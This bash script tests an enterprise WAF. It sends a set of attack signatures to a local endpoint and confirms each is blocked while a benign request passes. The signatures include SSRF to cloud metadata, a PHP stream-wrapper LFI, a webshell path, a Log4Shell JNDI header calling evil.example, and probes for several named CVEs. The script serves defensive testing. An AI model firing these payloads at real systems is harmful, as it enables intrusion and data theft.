#!/usr/bin/env bash
# SPDX-License-Identifier: BUSL-1.1
#
# check_curated_rules.sh — fire a battery of curated-ruleset payloads (native categories + named
# CVEs) at a running enterprise WAF and confirm each is BLOCKED, while a benign request passes.
#
# The curated CRS module (`[enterprise.crs_curated]`) must be ENABLED and the WAF in
# `mode = "blocking"` with a `block_threshold` a single CRITICAL hit crosses (<= 6). Attacks are
# blocked BEFORE the backend is reached, so the backend can be any dummy server.
#
# A blocked request returns the WAF's block status (403 by default). "Passed" = the request reached
# the backend (2xx/3xx/404 from the backend, NOT 403). We treat 403 as the block signal.
#
# Config via env (defaults in brackets):  HOST [127.0.0.1]  PORT [8080]  TIMEOUT [5]  BLOCK_CODE [403]
#
# Usage:  ./check_curated_rules.sh
#         PORT=8080 ./check_curated_rules.sh
set -uo pipefail

HOST="${HOST:-127.0.0.1}"
PORT="${PORT:-8080}"
TIMEOUT="${TIMEOUT:-5}"
BLOCK_CODE="${BLOCK_CODE:-403}"
BASE="http://${HOST}:${PORT}"

pass=0
fail=0

# code_for <curl args...> → prints the HTTP status code (000 on transport error).
code_for() {
  curl -s -o /dev/null -w '%{http_code}' --max-time "$TIMEOUT" "$@" 2>/dev/null || echo 000
}

# attack <name> <curl args...> — expect the WAF to BLOCK (status == BLOCK_CODE).
attack() {
  local name=$1; shift
  local code; code=$(code_for "$@")
  if [[ "$code" == "$BLOCK_CODE" ]]; then
    printf '  [BLOCK ok ] %-40s -> %s\n' "$name" "$code"; pass=$((pass + 1))
  else
    printf '  [MISS     ] %-40s -> %s (expected %s)\n' "$name" "$code" "$BLOCK_CODE"; fail=$((fail + 1))
  fi
}

# benign <name> <curl args...> — expect the WAF to PASS it through (status != BLOCK_CODE).
benign() {
  local name=$1; shift
  local code; code=$(code_for "$@")
  if [[ "$code" != "$BLOCK_CODE" ]]; then
    printf '  [PASS ok  ] %-40s -> %s\n' "$name" "$code"; pass=$((pass + 1))
  else
    printf '  [FALSE +  ] %-40s -> %s (blocked a benign request!)\n' "$name" "$code"; fail=$((fail + 1))
  fi
}

echo "Target: ${BASE}  (block code = ${BLOCK_CODE})"
echo
echo "Category signatures (CRITICAL):"
attack "SSRF cloud metadata"        "${BASE}/?url=http://169.254.169.254/latest/meta-data/"
attack "PHP stream wrapper (LFI)"   "${BASE}/?file=php://filter/convert.base64-encode/resource=x"
attack "webshell filename"          "${BASE}/uploads/c99.php"
attack "Log4Shell (header)"         -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' "${BASE}/"
attack "Spring4Shell (param name)"  "${BASE}/?class.module.classLoader.x=1"

echo
echo "Named CVE signatures:"
attack "CVE-2026-48907 Joomla JCE"  "${BASE}/index.php?option=com_jce&task=profiles.import"
attack "CVE-2025-29927 Next.js"     -H 'x-middleware-subrequest: middleware' "${BASE}/"
attack "CVE-2025-53770 ToolShell"   "${BASE}/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
attack "CVE-2024-4577 PHP-CGI"      "${BASE}/php-cgi/php.exe?%ADd+allow_url_include=on"
attack "CVE-2023-34362 MOVEit"      "${BASE}/moveitisapi/moveitisapi.dll"
attack "CVE-2025-31161 GoAnywhere"  "${BASE}/goanywhere/lic/accept/"
attack "CVE-2025-64446 FortiWeb"    "${BASE}/api/v2.0/user/..%2f..%2fetc"
attack "CVE-2024-3400 PAN-OS"       -H 'Cookie: SESSID=../../../opt/panlogs/tmp/x' "${BASE}/ssl-vpn/"

echo
echo "Control (must PASS):"
benign "benign browse"              -H 'User-Agent: Mozilla/5.0' "${BASE}/index.html?q=hello&page=2"

echo
echo "==================================================================="
echo "  passed: ${pass}   failed: ${fail}"
echo "==================================================================="
[[ "$fail" -eq 0 ]] || {
  echo "[!] Some checks failed. If ALL attacks MISS, confirm [enterprise.crs_curated].enabled=true," >&2
  echo "    mode=\"blocking\", and block_threshold <= 6. If BLOCK_CODE differs, set BLOCK_CODE=<code>." >&2
  exit 1
}
echo "[+] curated ruleset verified on the wire."
